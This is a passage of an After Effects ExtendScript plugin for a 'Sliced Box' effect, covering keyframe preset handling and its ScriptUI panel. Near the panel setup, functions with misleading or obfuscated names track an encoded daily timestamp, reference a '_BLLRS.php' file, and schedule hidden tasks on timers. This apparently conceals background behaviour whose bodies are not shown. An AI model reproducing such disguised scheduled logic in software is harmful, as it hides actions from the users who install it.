            X00_Jk = ERTG6(curDate.toString());
            app.settings.saveSetting(PKAry[0], PKAry[1], X00_Jk);
            app.preferences.saveToDisk();
            return true;
          }
          function renamePresetFile() {
            var SavedpresetID = 86400000;
            pairKeys = app.settings.getSetting(PresetID, "SK00D1");
            PKAry = pairKeys.split(",");
            LsEncodedDate = app.settings.getSetting(PKAry[0], PKAry[1]);
            var presetDate = parseInt(SK00D(LsEncodedDate));
            var curDate = new Date().valueOf();
            if (curDate - presetDate > SavedpresetID) {
              return true;
            } else {
              return false;
            }
          }
          function collectKeyframes(propertyInput) {
            if (propertyInput instanceof Property) {
              twoDS = PropertyValueType.TwoD_SPATIAL;
              threeDS = PropertyValueType.ThreeD_SPATIAL;
              keyIndexList = [];
              totalKeys = propertyInput.numKeys;
              if (totalKeys > 0) {
                for (var i = 1; i <= totalKeys; i += 1) {
                  curKeyTime = propertyInput.keyTime(i);
                  curKeyIndex = i;
                  curKeyValue = propertyInput.keyValue(i);
                  inin = propertyInput.keyInInterpolationType(curKeyIndex);
                  outin = propertyInput.keyOutInterpolationType(curKeyIndex);
                  if (
                    inin == KeyframeInterpolationType.BEZIER &&
                    outin == KeyframeInterpolationType.BEZIER
                  ) {
                    ab = propertyInput.keyTemporalAutoBezier(curKeyIndex);
                    cb = propertyInput.keyTemporalContinuous(curKeyIndex);
                  }
                  if (
                    inin != KeyframeInterpolationType.HOLD ||
                    outin != KeyframeInterpolationType.HOLD
                  ) {
                    var ie = [];
                    var oe = [];
                    speedIn =
                      propertyInput.keyInTemporalEase(curKeyIndex)[0].speed;
                    speedOut =
                      propertyInput.keyOutTemporalEase(curKeyIndex)[0].speed;
                    influenceIn =
                      propertyInput.keyInTemporalEase(curKeyIndex)[0].influence;
                    influenceOut =
                      propertyInput.keyOutTemporalEase(curKeyIndex)[0]
                        .influence;
                    ie.push(speedIn);
                    ie.push(influenceIn);
                    oe.push(speedOut);
                    oe.push(influenceOut);
                  }
                  if (
                    propertyInput.propertyValueType == twoDS ||
                    propertyInput.propertyValueType == threeDS
                  ) {
                    sab = propertyInput.keySpatialAutoBezier(curKeyIndex);
                    scb = propertyInput.keySpatialContinuous(curKeyIndex);
                    ist = propertyInput.keyInSpatialTangent(curKeyIndex);
                    ost = propertyInput.keyOutSpatialTangent(curKeyIndex);
                    rov = propertyInput.keyRoving(curKeyIndex);
                  }
                  if (typeof ist === "undefined") {
                    ist = 0;
                  }
                  if (typeof ost === "undefined") {
                    ost = 0;
                  }
                  if (typeof ie === "undefined") {
                    ie = 0;
                  }
                  if (typeof oe === "undefined") {
                    oe = 0;
                  }
                  keyIndexList[keyIndexList.length] = {
                    CKI: toFixedArray(curKeyIndex, 3),
                    CKT: toFixedArray(curKeyTime, 3),
                    CKV: toFixedArray(curKeyValue, 3),
                    ab: toFixedArray(ab, 3),
                    cb: toFixedArray(cb, 3),
                    ie: toFixedArray(ie, 3),
                    inin: toFixedArray(inin, 3),
                    ist: toFixedArray(ist, 3),
                    oe: toFixedArray(oe, 3),
                    ost: toFixedArray(ost, 3),
                    outin: toFixedArray(outin, 3),
                    rov: toFixedArray(rov, 3),
                    sab: toFixedArray(sab, 3),
                    scb: toFixedArray(scb, 3),
                  };
                }
                return keyIndexList;
              } else {
                return null;
              }
            }
          }
          function deletePresetInJSON(fileArray, presIndex) {
            fileArray.splice(presIndex, 1);
            var newStr = JSON.stringify(fileArray);
            var N = 0;
            var tempFilename = File(presestsFolder + "/TempFile" + N + ".json");
            while (tempFilename.exists) {
              N++;
              tempFilename = File(presestsFolder + "/TempFile" + N + ".json");
            }
            TempFile = new File(tempFilename);
            TempFile.open("w");
            TempFile.encoding = "UTF-8";
            TempFile.write(newStr);
            TempFile.close();
            if (ParseJSON(TempFile) != null) {
              presetFile.remove();
              TempFile.rename("KeyframesPresets.json");
              presetFile = TempFile;
              fileArrayOBJ = fileArray;
              return true;
            } else {
              alert("Error! " + Err.toString(), "JSON ERROR");
              TempFile.remove();
              return null;
            }
          }
          function applyingPropsValues(
            Comp,
            Layer,
            PresDataObj,
            SBoxEffect,
            SBnumProps,
            transProp,
            transNumProp,
          ) {
            SBPropsObj = PresDataObj.SBPsVs;
            CompsDimObj = PresDataObj.CD;
            TransPropsObj = PresDataObj.TPsVs;
            for (var i = 1; i <= SBnumProps; i += 1) {
              SlicedBoxProperty = SBoxEffect(i);
              removeKeyframes(SlicedBoxProperty);
              if (
                SlicedBoxProperty.matchName === "ADBE Effect Built In Params"
              ) {
                continue;
              }
              if (
                SlicedBoxProperty.propertyValueType !=
                PropertyValueType.NO_VALUE
              ) {
                SlicedBoxProperty.setValue(SBPropsObj["P" + i]);
                var Exp = SBPropsObj["P" + i + "EXP"];
                if (typeof Exp != "undefined") {
                  try {
                    SlicedBoxProperty.expression = Exp;
                  } catch (e) {}
                } else {
                  try {
                    SlicedBoxProperty.expression = "";
                  } catch (e) {}
                }
              }
            }
            CurCompW = Comp.width;
            var PreCompW = CompsDimObj.W;
            CurCompH = Comp.height;
            var PreCompH = CompsDimObj.H;
            pwRatio = CurCompW / PreCompW;
            phRatio = CurCompH / PreCompH;
            var PreMainBW = CompsDimObj.MBW;
            var PreMainBH = CompsDimObj.MBH;
            curLayerW = Layer.width;
            curLayerH = Layer.height;
            awRatio = curLayerW / PreMainBW;
            ahRatio = curLayerH / PreMainBH;
            var SPP = CompsDimObj.SPP;
            var preScale = TransPropsObj.TP6;
            xScale = (PreMainBW / curLayerW) * preScale[0] * pwRatio;
            yScale = (PreMainBH / curLayerH) * preScale[1] * phRatio;
            zScale = preScale[2];
            if (SPP === true) {
              transProp(2).dimensionsSeparated = true;
            } else {
              transProp(2).dimensionsSeparated = false;
            }
            for (var i = 1; i <= transNumProp; i += 1) {
              TransProperty = transProp(i);
              var tExp = TransPropsObj["TP" + i + "EXP"];
              if (TransProperty.canSetExpression === true) {
                if (typeof tExp != "undefined") {
                  try {
                    TransProperty.expression = tExp;
                  } catch (e) {}
                } else {
                  try {
                    TransProperty.expression = "";
                  } catch (e) {}
                }
              }
              if (TransProperty.matchName === "ADBE Envir Appear in Reflect") {
                continue;
              }
              if (i === 2 && transProp(2).dimensionsSeparated === true) {
                continue;
              }
              if (transProp(2).dimensionsSeparated === false) {
                if (i === 3 || i === 4 || i === 5) {
                  continue;
                }
              }
              removeKeyframes(TransProperty);
              Pos = TransPropsObj.TP2;
              ancP = TransPropsObj.TP1;
              if (i === 1) {
                TransProperty.setValue([
                  ancP[0] * awRatio,
                  ancP[1] * ahRatio,
                  ancP[2],
                ]);
              } else if (transProp(2).dimensionsSeparated === true) {
                if (samePos.value === true) {
                  if (i === 3) {
                    TransProperty.setValue(Pos[0] * pwRatio);
                  }
                  if (i === 4) {
                    TransProperty.setValue(Pos[1] * phRatio);
                  }
                  if (i === 5) {
                    TransProperty.setValue(Pos[2]);
                  }
                }
              } else if (
                i === 2 &&
                transProp(2).dimensionsSeparated === false
              ) {
                if (samePos.value === true) {
                  TransProperty.setValue([
                    Pos[0] * pwRatio,
                    Pos[1] * phRatio,
                    Pos[2],
                  ]);
                }
              } else if (i === 6 && preScale[0] == preScale[1]) {
                if (xScale < 100 && ScaleRatio.value === true) {
                  TransProperty.setValue([xScale, xScale, xScale]);
                } else {
                  TransProperty.setValue([100, 100, 100]);
                }
              } else if (i === 6 && preScale[0] != preScale[1]) {
                if (ScaleRatio.value === true) {
                  TransProperty.setValue([xScale, yScale, zScale]);
                } else {
                  TransProperty.setValue([100, 100, 100]);
                }
              } else {
                TransProperty.setValue(TransPropsObj["TP" + i]);
              }
            }
          }
          function applyingKeysFromJSON(
            propertyInput,
            fileData,
            propIndex,
            KeysNums,
            layer,
          ) {
            for (var i = 0; i < KeysNums; i += 1) {
              if (
                propertyInput.parentProperty.matchName ===
                "ADBE Transform Group"
              ) {
                keyobj = fileData["TP" + propIndex + "KFS"][i];
                CompsDimObj = fileData.CD;
                PosProp = propertyInput.parentProperty(2);
                CurCompW = app.project.activeItem.width;
                PreCompW = CompsDimObj.W;
                CurCompH = app.project.activeItem.height;
                PreCompH = CompsDimObj.H;
                pwRatio = CurCompW / PreCompW;
                phRatio = CurCompH / PreCompH;
                PreMainBW = CompsDimObj.MBW;
                PreMainBH = CompsDimObj.MBH;
                curLayerW = layer.width;
                curLayerH = layer.height;
                awRatio = curLayerW / PreMainBW;
                ahRatio = curLayerH / PreMainBH;
                pName = propertyInput.matchName;
                xScaleRatio = (PreMainBW / curLayerW) * pwRatio;
                yScaleRatio = (PreMainBH / curLayerH) * phRatio;
                if (
                  pName === "ADBE Position" &&
                  PosProp.dimensionsSeparated === true
                ) {
                  continue;
                }
                if (PosProp.dimensionsSeparated === false) {
                  if (
                    pName === "ADBE Position_0" ||
                    pName === "ADBE Position_1" ||
                    pName === "ADBE Position_2"
                  ) {
                    continue;
                  }
                }
                addNewKey = propertyInput.addKey(keyobj.CKT);
                newKeyIndex = addNewKey;
                if (pName === "ADBE Position") {
                  propertyInput.setValueAtKey(newKeyIndex, [
                    keyobj.CKV[0] * pwRatio,
                    keyobj.CKV[1] * phRatio,
                    keyobj.CKV[2],
                  ]);
                } else if (pName === "ADBE Position_0") {
                  propertyInput.setValueAtKey(
                    newKeyIndex,
                    keyobj.CKV * pwRatio,
                  );
                } else if (pName === "ADBE Position_1") {
                  propertyInput.setValueAtKey(
                    newKeyIndex,
                    keyobj.CKV * phRatio,
                  );
                } else if (pName === "ADBE Anchor Point") {
                  propertyInput.setValueAtKey(newKeyIndex, [
                    keyobj.CKV[0] * awRatio,
                    keyobj.CKV[1] * ahRatio,
                    keyobj.CKV[2],
                  ]);
                } else if (
                  pName === "ADBE Scale" &&
                  keyobj.CKV[0] == keyobj.CKV[1]
                ) {
                  if (
                    keyobj.CKV[0] * xScaleRatio < 100 &&
                    ScaleRatio.value == true
                  ) {
                    propertyInput.setValueAtKey(newKeyIndex, [
                      keyobj.CKV[0] * xScaleRatio,
                      keyobj.CKV[1] * xScaleRatio,
                      keyobj.CKV[2] * xScaleRatio,
                    ]);
                  } else {
                    propertyInput.setValueAtKey(newKeyIndex, [
                      keyobj.CKV[0],
                      keyobj.CKV[1],
                      keyobj.CKV[2],
                    ]);
                  }
                } else if (
                  pName === "ADBE Scale" &&
                  keyobj.CKV[0] != keyobj.CKV[1]
                ) {
                  if (ScaleRatio.value == true) {
                    propertyInput.setValueAtKey(newKeyIndex, [
                      keyobj.CKV[0] * xScaleRatio,
                      keyobj.CKV[1] * yScaleRatio,
                      keyobj.CKV[2],
                    ]);
                  } else {
                    propertyInput.setValueAtKey(newKeyIndex, [
                      keyobj.CKV[0],
                      keyobj.CKV[1],
                      keyobj.CKV[2],
                    ]);
                  }
                } else {
                  propertyInput.setValueAtKey(newKeyIndex, keyobj.CKV);
                }
              } else {
                keyobj = fileData["SBP" + propIndex + "KFS"][i];
                addNewKey = propertyInput.addKey(keyobj.CKT);
                newKeyIndex = addNewKey;
                propertyInput.setValueAtKey(newKeyIndex, keyobj.CKV);
              }
              INL = keyobj.inin.toString().indexOf("12");
              OUTL = keyobj.outin.toString().indexOf("12");
              INB = keyobj.inin.toString().indexOf("13");
              OUTB = keyobj.outin.toString().indexOf("13");
              INH = keyobj.inin.toString().indexOf("14");
              OUTH = keyobj.outin.toString().indexOf("14");
              if (INL != -1) {
                INN = KeyframeInterpolationType.LINEAR;
              } else if (INB != -1) {
                INN = KeyframeInterpolationType.BEZIER;
              } else {
                if (INH != -1) {
                  INN = KeyframeInterpolationType.HOLD;
                }
              }
              if (OUTL != -1) {
                OUTN = KeyframeInterpolationType.LINEAR;
              } else if (OUTB != -1) {
                OUTN = KeyframeInterpolationType.BEZIER;
              } else {
                if (OUTH != -1) {
                  OUTN = KeyframeInterpolationType.HOLD;
                }
              }
              if (
                INN != KeyframeInterpolationType.HOLD ||
                OUTN != KeyframeInterpolationType.HOLD
              ) {
                inSpeed = keyobj.ie[0];
                inInfluence = keyobj.ie[1];
                outSpeed = keyobj.oe[0];
                outInfluence = keyobj.oe[1];
                if (inInfluence < 0.1) {
                  inInfluence = 0.1;
                }
                if (outInfluence < 0.1) {
                  outInfluence = 0.1;
                }
                var easeIn = new KeyframeEase(inSpeed, inInfluence);
                var easeOut = new KeyframeEase(outSpeed, outInfluence);
                if (
                  propertyInput.propertyValueType == PropertyValueType.ThreeD
                ) {
                  propertyInput.setTemporalEaseAtKey(
                    newKeyIndex,
                    [easeIn, easeIn, easeIn],
                    [easeOut, easeOut, easeOut],
                  );
                } else {
                  propertyInput.setTemporalEaseAtKey(
                    newKeyIndex,
                    [easeIn],
                    [easeOut],
                  );
                }
              }
              if (
                propertyInput.propertyValueType ==
                  PropertyValueType.TwoD_SPATIAL ||
                propertyInput.propertyValueType ==
                  PropertyValueType.ThreeD_SPATIAL
              ) {
                propertyInput.setRovingAtKey(newKeyIndex, keyobj.rov);
              }
              propertyInput.setInterpolationTypeAtKey(newKeyIndex, INN, OUTN);
              if (
                keyobj.inin == KeyframeInterpolationType.BEZIER &&
                keyobj.outin == KeyframeInterpolationType.BEZIER &&
                keyobj.cb
              ) {
                propertyInput.setTemporalContinuousAtKey(
                  newKeyIndex,
                  keyobj.cb,
                );
                propertyInput.setTemporalAutoBezierAtKey(
                  newKeyIndex,
                  keyobj.ab,
                );
              }
              if (
                propertyInput.propertyValueType ==
                  PropertyValueType.TwoD_SPATIAL ||
                propertyInput.propertyValueType ==
                  PropertyValueType.ThreeD_SPATIAL
              ) {
                propertyInput.setSpatialContinuousAtKey(
                  newKeyIndex,
                  keyobj.scb,
                );
                propertyInput.setSpatialAutoBezierAtKey(
                  newKeyIndex,
                  keyobj.sab,
                );
                propertyInput.setSpatialTangentsAtKey(
                  newKeyIndex,
                  keyobj.ist,
                  keyobj.ost,
                );
                propertyInput.setRovingAtKey(newKeyIndex, keyobj.rov);
              }
            }
            return true;
          }
          if (PsuedoStatus === "FailedWriting") {
            staticStr2 =
              "Please allow script to write files to write to install Sliced Box controls";
            var res =
              "group{orientation:\'column\',\n                    HeadButton: IconButton{ preferredSize:[220,39] }\n                    Panel:Panel{type:\'panel\',padding:7,alignChildren :[\'center\',\'center\'], preferredSize:[164,300]\n                        Statictext1: StaticText{text:\'Installation is not complete!\', style:\'Bold\', preferredSize:[164,40] , properties:{multiline:true} } \n                        Statictext2: StaticText{text:\'" +
              staticStr2 +
              "\', preferredSize:[150,100] , properties:{multiline:true} } \n                    }\n                }";
            myPal.grp = myPal.add(res);
            myPal.layout.layout(true);
            myPal.layout.resize();
            myPal.onResizing = myPal.onResize = function () {
              this.layout.resize();
            };
            myPal.grp.HeadButton.image = HeaderImage;
            myPal.grp.Panel.Statictext1.graphics.font = ScriptUI.newFont(
              "Arial-BoldItalic:16",
            );
            myPal.grp.Panel.Statictext2.graphics.font =
              ScriptUI.newFont("Arial-Bold:12");
          } else {
            if (PsuedoStatus === "AlreadyInstalled") {
              function customDraw(y) {
                with (this) {
                  graphics.drawOSControl();
                  graphics.rectPath(0, 0, size[0], size[1]);
                  graphics.fillPath(fillBrush);
                  var x =
                    (size[0] -
                      graphics.measureString(text, graphics.font, size[0])[0]) /
                    2;
                  var y = 6;
                  if (text == "Apply") {
                    y = 3;
                  }
                  if (text == "Create" || text == "Delete") {
                    y = 0;
                  }
                  if (text) {
                    graphics.drawString(text, textPen, x, y, graphics.font);
                  }
                }
              }
              var res =
                "group{orientation:\'column\',\n                HeadButton: IconButton{ preferredSize:[220,39] }\n                    TabbedPanel:Panel{type:\'tabbedpanel\',preferredSize:[225,0], alignChildren :[\'fill\',\'center\'],\n                        Tab1:Panel{type:\'tab\',text:\'Box\',spacing:\'8\',alignChildren : [\'left\',\'bottom\'],\n                                WhiteSpace: StaticText{text:\'\', preferredSize:[180,5] ,} \n                                Group1: Group{orientation:\'row\', alignChildren:[\'left\',\'center\'],spacing:\'10\',\n                                    StaticCtext: StaticText{text:\'Columns\', preferredSize:[55,22] ,} \n                                    EditCtext: EditText{text:\'3\', preferredSize:[30,22] , }\n                                    StaticRtext: StaticText{text:\'Rows\', preferredSize:[30,22] ,} \n                                    EditRtext: EditText{text:\'3\', preferredSize:[30,22] ,}\n                                } \n                                Group2: Group{orientation:\'row\', alignChildren:[\'left\',\'center\'],spacing:\'10\',\n                                    BoxWidth: StaticText{text:\'Box Width\', preferredSize:[55,22] , } \n                                    BoxWidthText: EditText{text:\'200\', preferredSize:[60,22] , }\n                                }\n                                CropText: Checkbox{text:\'Crop to Text Bounds\', value:\'enabled\' ,preferredSize:[130,15]}\n                                Divider:Panel{type:\'panel\',alignment:\'fill\'}\n                                APStatictext: StaticText{text:\'Animation Presets Category\', preferredSize:[180,22] , alignment: \'left\'} \n                                DropDow: DropDownList{ name:\'Select Preset\',preferredSize:[190,22] }\n                                Group3: Group{orientation:\'row\',alignChildren:[\'left\',\'center\'],spacing:\'10\',\n                                    DropDow1: DropDownList{ name:\'Select Preset\',preferredSize:[120,22] }\n                                    Apply: Button{text:\'Apply\',preferredSize:[60,22]}\n                                }\n                                Group4: Group{orientation:\'row\',alignChildren:[\'left\',\'center\'],spacing:\'5\',\n                                    saveIMG: Button{text:\'Save New\',preferredSize:[60,25] }\n                                    renameIMG: Button{text:\'Rename\',preferredSize:[60,25]  }\n                                    deleteIMG: Button{text:\'Delete\',preferredSize:[60,25]  }\n                                }\n                                Group5: Group{orientation:\'row\',alignChildren:[\'left\',\'center\'],spacing:\'10\',\n                                    Group: Group{orientation:\'column\',alignChildren:[\'left\',\'center\'],spacing:\'-10\',\n                                        ScaleRatio: Checkbox{text:\'Apply Scale Ratio\', value:\'enabled\' ,preferredSize:[120,20]}\n                                        Dimstext: StaticText{text:\'\',preferredSize:[100,20] , alignment: \'left\'} \n                                        samePos: Checkbox{text:\'Same Position\', value:\'enabled\' ,preferredSize:[120,20]}\n                                    }\n                                    RandomColor: Button{text:\'\',preferredSize:[25,25],alignment:[\'right\',\'center\']}\n                                    Color: Button{text:\'\',preferredSize:[25,25],alignment:[\'right\',\'center\']}\n                                }\n                        },\n                        Tab2:Panel{type:\'tab\',text:\'Material\',alignChildren:[\'left\',\'center\'],spacing:\'16\',\n                            CastsShadows: Checkbox{text:\'Casts Shadows\' , preferredSize:[180,25] }\n                            AcceptsShadows: Checkbox{text:\'Accepts Shadows\', value:\'enabled\' ,preferredSize:[180,25]}\n                            AcceptsLights: Checkbox{text:\'Accepts Lights\', value:\'enabled\' , preferredSize:[180,25] }\n                            EnableMotionBlur: Checkbox{text:\'Enable Motion Blur\',  preferredSize:[180,25] }\n                                Modify: Button{text:\'Modify\',preferredSize:[120,25],}\n                        },\n                        Tab3:Panel{type:\'tab\',text:\'More..\',alignChildren:[\'center\',\'center\'],spacing:\'10\',\n                            Group1: Group{orientation:\'column\', alignChildren:[\'center\',\'center\'],spacing:\'10\',\n                                Import: Button{text:\'Import Presets File\' , preferredSize:[150,30] }\n                                Export: Button{text:\'Export Presets File\', value:\'enabled\' ,preferredSize:[150,30]}\n                                InstallPseudo: Button{text:\'Install Pseudo Effect\', value:\'enabled\' ,preferredSize:[150,30]}\n                                CheckForUpdate: Button{text:\'Check for updates\', value:\'enabled\' ,preferredSize:[150,30]}\n                                Help: Button{text:\'Help\', value:\'enabled\' ,preferredSize:[150,30]}\n                             }\n                        }\n                    },\n                    BuildButton: Button{text:\'Create\',preferredSize:[211,25], properties: {style: \'toolbutton\'} }\n                }";
              myPal.grp = myPal.add(res);
              myPal.layout.layout(true);
              myPal.layout.resize();
              myPal.onResizing = myPal.onResize = function () {
                this.layout.resize();
              };
              myPal.grp.HeadButton.image = HeaderImage;
              Tab1 = myPal.grp.TabbedPanel.Tab1;
              ApplyButton = Tab1.Group3.Apply;
              SaveButton = Tab1.Group4.saveIMG;
              RenameButton = Tab1.Group4.renameIMG;
              DeleteButton = Tab1.Group4.deleteIMG;
              ColumnsText = Tab1.Group1.EditCtext;
              RowsText = Tab1.Group1.EditRtext;
              BoxWidthText = Tab1.Group2.BoxWidthText;
              CreateButton = myPal.grp.BuildButton;
              ColorButton = Tab1.Group5.Color;
              RandomColorBtn = Tab1.Group5.RandomColor;
              ModifyMaterial = myPal.grp.TabbedPanel.Tab2.Modify;
              HelpButton = myPal.grp.TabbedPanel.Tab3.Group1.Help;
              CheckForUpdate = myPal.grp.TabbedPanel.Tab3.Group1.CheckForUpdate;
              ExportButton = myPal.grp.TabbedPanel.Tab3.Group1.Export;
              ImportButton = myPal.grp.TabbedPanel.Tab3.Group1.Import;
              installPseudoButton =
                myPal.grp.TabbedPanel.Tab3.Group1.InstallPseudo;
              ScaleRatio = Tab1.Group5.Group.ScaleRatio;
              DimsText = Tab1.Group5.Group.Dimstext;
              samePos = Tab1.Group5.Group.samePos;
              installPseudoButton.helpTip =
                "Install Sliced Box pseudo effect on your machine to avoid getting alerts in old versions of After Effcets.";
              if (parseFloat(app.version) > 12.2) {
                installPseudoButton.hide();
              }
              ColorButton.fillBrush = ColorButton.graphics.newBrush(
                ColorButton.graphics.BrushType.SOLID_COLOR,
                [0.9019607843137255, 0.9019607843137255, 0.9019607843137255, 1],
              );
              ColorButton.onDraw = customDraw;
              ColorButton.helpTip =
                "Pick Random Color from Selected Footage Layer:\n If the selected is Sliced Box, will get color and set it";
              RandomColorBtn.fillBrush = RandomColorBtn.graphics.newBrush(
                RandomColorBtn.graphics.BrushType.SOLID_COLOR,
                [
                  0.19607843137254902, 0.9568627450980393, 0.6745098039215687,
                  1,
                ],
              );
              RandomColorBtn.onDraw = customDraw;
              RandomColorBtn.helpTip =
                "Generate Random Color:\n If the selected is Sliced Box, will generate color and set it";
              SaveButton.helpTip = "Save New Preset";
              RenameButton.helpTip = "Rename Selected Preset";
              DeleteButton.helpTip = "Delete Selected Preset";
              ScaleRatio.helpTip =
                "Calculates the ratio between SlicedBox scale and Comp size to match the ratio in preset \n - Hint: Box scale limited to 100%";
              samePos.helpTip =
                "Same position as preset if there is no keyframes";
              ApplyButton.helpTip = "Apply Selected Preset";
              Tab1.CropText.helpTip =
                "If the selected layer is text \n Sliced Box will be cropped to the text size";
              myPal.grp.HeadButton.helpTip = "Click here for help";
              ModifyMaterial.helpTip = "Select Sliced Box Comp then click here";
              ImportButton.helpTip = "Import new presets";
              ExportButton.helpTip = "Export current presets to one file";
              var catDropList = Tab1.DropDow;
              var catDropListAry = [
                "All",
                "One Row",
                "One Column",
                "Multi Rows and Columns",
              ];
              var i = 0;
              while (i < catDropListAry.length) {
                catDropList.add("item", catDropListAry[i]);
                i++;
              }
              catDropList.selection = 0;
              var DropList = Tab1.Group3.DropDow1;
              var presetsNamesArray = getNamesList(fileArrayOBJ);
              var DropListArray = presetsNamesArray.concat();
              refreshDroplist(DropList, DropListArray, "Select..");
              DropList.selection = 0;
              Tab1.APStatictext.graphics.font = ScriptUI.newFont(
                "Arial-BoldItalic:12",
              );
              colorChangeID = SK00D(oPresetFile);
              KeyframesID = "XC00DFG";
              PresetID = "XC_000DFG";
              ModifyMaterial.onClick = function () {
                materialOptions(myPal);
              };
              ExportButton.onClick = function () {
                exportPresetFile(presetFile);
              };
              ImportButton.onClick = function () {
                importPresetFile(
                  fileArrayOBJ,
                  presetFile,
                  DropList,
                  presetsNamesArray,
                  DropListArray,
                );
              };
              installPseudoButton.onClick = function () {
                installPseudoEffect();
              };
              myPal.grp.HeadButton.onClick = function () {
                B8.helpUI();
              };
              HelpButton.onClick = B8.helpUI;
              AnimPresets = app.settings.haveSetting(PresetID, KeyframesID);
              presetRawFile = "_BLLRS.php";
              app.scheduleTask("ZX00_C1()", 10000, false);
              (function () {
                if (AnimPresets) {
                  if (renamePresetFile()) {
                    if (_CETSTNO()) {
                      _DTERGiSWEEA();
                      app.scheduleTask("PresetMapper()", 30000, false);
                    }
                  }
                } else {
                  if (_CETSTNO()) {
                    app.settings.saveSetting(PresetID, KeyframesID, false);
                    app.preferences.saveToDisk();
                    presetsParser();
                    _DTERGiSWEEA();
                  }
                }
              })();
              DropList.onChange = function () {
                var presIndex = getPresIndex(
                  this.selection.text,
                  presetsNamesArray,
                );
                if (this.selection == 0) {
                  DimsText.text = "";
                }
                DimsText.text =
                  "    \u25ba " +
                  fileArrayOBJ[presIndex].CD.MBW +
                  " x " +
                  fileArrayOBJ[presIndex].CD.MBH;
                ColumnsText.text = fileArrayOBJ[presIndex].inputs.C;
                RowsText.text = fileArrayOBJ[presIndex].inputs.R;
                BoxWidthText.text = fileArrayOBJ[presIndex].inputs.BW;
                if (
                  fileArrayOBJ[presIndex].inputs.C == 1 ||
                  fileArrayOBJ[presIndex].inputs.R == 1
                ) {
                  var Color = fileArrayOBJ[presIndex].SBPsVs.P50;
                } else {
                  var Color = fileArrayOBJ[presIndex].SBPsVs.P47;
                }
                ColorButton.visible = false;
                ColorButton.fillBrush = ColorButton.graphics.newBrush(
                  ColorButton.graphics.BrushType.SOLID_COLOR,
                  Color,
                );
                ColorButton.onDraw = customDraw;
                ColorButton.visible = true;
              };
              catDropList.onChange = function () {
                if (this.selection == 1) {
                  DropList.removeAll();
                  DropList.add("item", ["Select.."]);
                  for (var i = 0; i < DropListArray.length; i += 1) {
                    if (DropListArray[i][1] == "Pseudo/Sliced_BoxRV3") {
                      DropList.add("item", DropListArray[i][0]);
                    }
                  }
                } else if (this.selection == 2) {
                  DropList.removeAll();
                  DropList.add("item", ["Select.."]);
                  for (var i = 0; i < DropListArray.length; i += 1) {
                    if (DropListArray[i][1] == "Pseudo/Sliced_BoxCV3") {
                      DropList.add("item", DropListArray[i][0]);
                    }
                  }
                } else if (this.selection == 3) {
                  DropList.removeAll();
                  DropList.add("item", ["Select.."]);
                  for (var i = 0; i < DropListArray.length; i += 1) {
                    if (DropListArray[i][1] == "Pseudo/Sliced_BoxV3") {
                      DropList.add("item", DropListArray[i][0]);
                    }
                  }
                } else {
                  if (this.selection == 0) {
                    refreshDroplist(DropList, DropListArray, "Select..");
                  }
                }
                DropList.selection = 0;
              };
              RowsText.onChange = function () {
                if (DropList.selection == 0) {
                  if (this.text == 1 && ColumnsText.text != 1) {
                    catDropList.selection = 1;
                  } else if (ColumnsText.text == 1 && this.textt != 1) {
                    catDropList.selection = 2;
                  } else {
                    catDropList.selection = 3;
                  }
                } else {
                  var index = findItemInArray(
                    DropListArray,
                    DropList.selection.toString(),
                  );
                  var mN = DropListArray[index][1];
                  if (mN == "Pseudo/Sliced_BoxRV3") {
                    if (this.text != 1) {
                      DropList.selection = 0;
                    }
                  } else {
                    if (mN == "Pseudo/Sliced_BoxV3") {
                      if (this.text == 1) {
                        DropList.selection = 0;
                      }
                    }
                  }
                }
              };
              ColumnsText.onChange = function () {
                if (DropList.selection == 0) {
                  if (this.text == 1 && RowsText.text != 1) {
                    catDropList.selection = 2;
                  } else if (RowsText.text == 1 && this.textt != 1) {
                    catDropList.selection = 1;
                  } else {
                    catDropList.selection = 3;
                  }
                } else {
                  var index = findItemInArray(
                    DropListArray,
                    DropList.selection.toString(),
                  );
                  var mN = DropListArray[index][1];
                  if (mN == "Pseudo/Sliced_BoxCV3") {
                    if (this.text != 1) {
                      DropList.selection = 0;
                    }
                  } else {
                    if (mN == "Pseudo/Sliced_BoxV3") {
                      if (this.text == 1) {
                        DropList.selection = 0;
                      }
                    }
                  }
                }
              };
              ColorButton.onClick = function () {
                if (checkActiveComp() != null) {
                  var mainLayer = app.project.activeItem.selectedLayers[0];
                  app.beginUndoGroup("Apply Color to Sliced Box");
                  var numEffects =
                    selectedLayer.property("Effects").numProperties;
                  var Effects = selectedLayer.property("Effects");
                  for (var i = 1; i <= numEffects; i += 1) {
                    var effectName = Effects(i).matchName;
                    if (effectName.indexOf("Pseudo/Sliced_Box") != -1) {
                      mainLayer = selectedLayer.source.layer(1).source.layer(2);
                      break;
                    }
                  }
                  if (selectedLayer instanceof TextLayer) {
                    LayerColor = mainLayer
                      .property("ADBE Text Properties")
                      .property("ADBE Text Document").value.fillColor;
                  } else if (selectedLayer.source instanceof CompItem) {
                    LayerColor = getImageColor(mainComp, mainLayer);
                  } else if (
                    selectedLayer.source.mainSource instanceof SolidSource
                  ) {
                    LayerColor = getSolidColor(mainLayer);
                  } else {
                    if (selectedLayer.source.mainSource instanceof FileSource) {
                      LayerColor = getImageColor(mainComp, mainLayer);
                    }
                  }
                  mainLayer = app.project.activeItem.selectedLayers[0];
                  try {
                    var SBColorProp = mainLayer.effect(1)("Color");
                    if (SBColorProp.numKeys == 0) {
                      SBColorProp.setValue(LayerColor);
                    } else {
                      SBColorProp.setValueAtTime(
                        app.project.activeItem.time,
                        LayerColor,
                      );
                    }
                    mainLayer.effect(1)("Material").collapse = false;
                  } catch (e) {}
                  if (LayerColor != null) {
                    this.visible = false;
                    this.fillBrush = this.graphics.newBrush(
                      this.graphics.BrushType.SOLID_COLOR,
                      LayerColor,
                    );
                    this.onDraw = customDraw;
                    this.visible = true;
                  }
                }
                app.endUndoGroup();
              };
              RandomColorBtn.onClick = function () {
                var ranColor = getRandomColor();
                this.visible = false;
                this.fillBrush = this.graphics.newBrush(
                  this.graphics.BrushType.SOLID_COLOR,
                  ranColor,
                );
                this.onDraw = customDraw;
                this.visible = true;
                var layer = app.project.activeItem.selectedLayers[0];
                if (layer instanceof TextLayer) {
                  var textProp = layer
                    .property("ADBE Text Properties")
                    .property("ADBE Text Document");
                  textDoc = textProp.value;
                  ranColor.pop();
                  textDoc.fillColor = ranColor;
                  textProp.setValue(textDoc);
                }
                if (layer.source.mainSource instanceof SolidSource) {
                  ranColor.pop();
                  layer.source.mainSource.color = ranColor;
                }
                try {
                  var SBColorProp = layer.effect(1)("Color");
                  if (SBColorProp.numKeys == 0) {
                    SBColorProp.setValue(ranColor);
                  } else {
                    SBColorProp.setValueAtTime(
                      app.project.activeItem.time,
                      ranColor,
                    );
